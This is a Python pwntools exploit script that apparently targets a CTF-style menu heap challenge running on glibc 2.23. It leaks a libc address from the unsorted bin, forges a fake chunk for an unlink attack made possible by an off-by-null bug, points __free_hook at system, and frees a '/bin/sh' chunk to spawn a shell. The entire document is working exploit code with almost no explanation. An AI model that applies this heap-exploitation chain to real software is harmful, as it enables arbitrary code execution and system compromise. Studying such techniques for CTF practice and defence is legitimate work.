from pwn import *

elf = ELF("./pwn")
libc = ELF("/home/***/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])
# elf.address = 0x555555554000

def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)
# pause()


add_chunk(3, 0x208)
add_chunk(4, 0x1f8)
add_chunk(5, 0x208)
# add_chunk(6, 0x20)

# unsorted bin leak
delete_chunk(3)
add_chunk(3, 0x208)
show_chunk(3)

# leak libc address
p.recvline()
tmp = p.recvuntil(b"\x7f")
print(f"tmp: {tmp[::-1].hex()}")
# print(f"tmp: {tmp.hex()}")
tmp = u64(tmp.ljust(0x8, b'\x00'))
# print(f"leak addr: {hex(tmp)}")

# libc addr
# libc.address = tmp - 0x39bb78
libc.address = tmp - 0x3c4b78
print(f"libc.address: {hex(libc.address)}")
print(f"__free_hook: {hex(libc.sym['__free_hook'])}")
print(f"system: {hex(libc.sym['system'])}")

# unlink
"""
cond 1. 全局指针数组中存放了fake_chunk起始地址
cond 2. fake_chunk->fd == 全局指针数组地址
cond 3. fake_chunk->bk == 全局指针数组地址 + 0x08
cond 4. fake_chunk大小符合smallbin
cond 5. 存在 off-by-null
"""
payload = b""
payload += p64(0)                               # fake_chunk prev_size
payload += p64(0x201)                           # fake_chunk size
payload += p64(elf.sym["chunk_list"])           # fake_chunk fd
payload += p64(elf.sym["chunk_list"] + 0x8)     # fake_chunk bk
payload = payload.ljust(0x200, b"a")
payload += p64(0x200)
payload += p8(0x0)
edit_chunk(3, payload)
delete_chunk(4)

# pause()

edit_chunk(5, b"/bin/sh\x00")
edit_chunk(3, p64(libc.sym["__free_hook"]))
edit_chunk(0, p64(libc.sym["system"]))

delete_chunk(5)

p.interactive()
